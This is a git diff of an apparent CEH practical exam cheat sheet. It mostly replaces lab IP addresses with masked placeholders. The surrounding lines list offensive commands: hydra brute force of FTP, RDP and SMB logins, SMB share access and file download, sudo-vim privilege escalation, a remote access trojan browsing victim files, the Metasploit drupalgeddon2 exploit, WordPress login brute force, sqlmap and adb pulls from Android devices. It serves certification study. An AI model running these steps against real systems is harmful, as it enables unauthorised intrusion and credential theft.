@@ -30,24 +30,24 @@ If even this the above command is not working then use this command-  namp -f xx
 5- FTP enum using nmap-  nmap -p 21 -A 10.xx.xx.xx 
 6- NetBios enum using enum4linux- enum4linux -u martin -p apple -n 10.xx.xx.xx (all info)
 				  enum4linux -u martin -p apple -P 10.xx.xx.xx (policy info)
-7- hydra -L username_file -P password_file 192.168.x.x ftp
-ftp 192.168.x.x
+7- hydra -L username_file -P password_file 10.xxx.x.x ftp
+ftp 10.xx.xx.xx
 get file
 cat file
-8- hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.10.55.X  Crack RDP Credentials
-9- smbclient -L \\10.10.55.X  to enumerate SMB Client
-10- hydra -L user_list.txt -P password_list.txt 10.10.55.X smb  brute force SMB credentials
-11- smbclient \\\\10.10.55.X\\share_name -U user%password123 or smbclient //target_ip/ -U USER_NAME or smbmap -u USER_NAME -p 'PASSWORD' -H TARGET_IP --download 'C$\file.txt'  Access SMB share
+8- hydra -t 1 -V -f -l Jones -P /home/passlist.txt rdp://10.xx.xx.X  Crack RDP Credentials
+9- smbclient -L \\10.xx.xx.x  to enumerate SMB Client
+10- hydra -L user_list.txt -P password_list.txt 10.xx.xx.x smb  brute force SMB credentials
+11- smbclient \\\\10.xx.xx.X\\share_name -U user%password123 or smbclient //target_ip/ -U USER_NAME or smbmap -u USER_NAME -p 'PASSWORD' -H TARGET_IP --download 'C$\file.txt'  Access SMB share
 get Sniffer.txt
 cat Sniffer.txt
-12- ssh marcus@10.10.55.X
+12- ssh marcus@10.xx.xx.X
 sudo -l
 sudo -i
 sudo vim
 find / -name "imroot.txt" 2>/dev/null
 cd /
 cat imroot.txt
-13- Thief RAT -> Connect to 10.10.55.X -> Authenticate
+13- Thief RAT -> Connect to 10.xx.xx.X -> Authenticate
 Thief RAT -> File Manager -> Navigate to C:\Users\Username\Documents
 Thief RAT -> File Manager -> Open folder -> Count files
 find / -type f -name Netnormal.txt 2> /dev/null
@@ -109,7 +109,7 @@ find / -name "*.txt" -ls 2> /dev/null
 ```
 1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
 2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
-3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
+3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.xx.xx.xx:8080/NEW --enumerate u  (u means username) 
 Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
  						 show options
 						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
@@ -130,12 +130,12 @@ Now you can do a RDP connection with the given ip and the Test account which you
 7- msfconsole
 search drupalgeddon2
 use exploit/unix/webapp/drupal_drupalgeddon2
-set RHOST 10.10.55.50
+set RHOST 10.xx.xx.xx
 set RPORT 80 # Ensure the port is correct for HTTP
 run
 find / -name Flag.txt 2>/dev/null
 cat /path/to/Flag.txt
-8- http://192.168.44.32:8080/DVWA/ECweb/Certified/
+8- http:/10.xx.xx.xx:8080/DVWA/ECweb/Certified/
 8.1- cat filename.txt | base64 --decode > decoded.txt
 8.2- Get-Content filename.txt | ForEach-Object { [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($_)) } > decoded.txt
 9- dirsearch -u https://example.com
@@ -176,7 +176,7 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 2- adb connect IP:5555    (Connect adb with parrot)
 3- adb shell              (Access mobile device on parrot)
 4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)
-5- adb connect 10.10.55.X:5555
+5- adb connect 10.xx.xx.xx:5555
 6- adb shell
 7- find /sdcard/ -name "*.jpg" -o -name "*.png"
 8- adb pull /sdcard/Downloads/CEH.jpg ./ceh.jpg or adb pull /sdcard/scan
@@ -196,7 +196,7 @@ MQTT for ioT devices
 # Find FQDN
 ```
 nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
-nmap --script smb-os-discovery -p 445 <DC-IP-Address>
+nmap --script smb-os-discovery -p 445 <IP-Address>
 ```
 # Cracking Wi-Fi networks
 ```
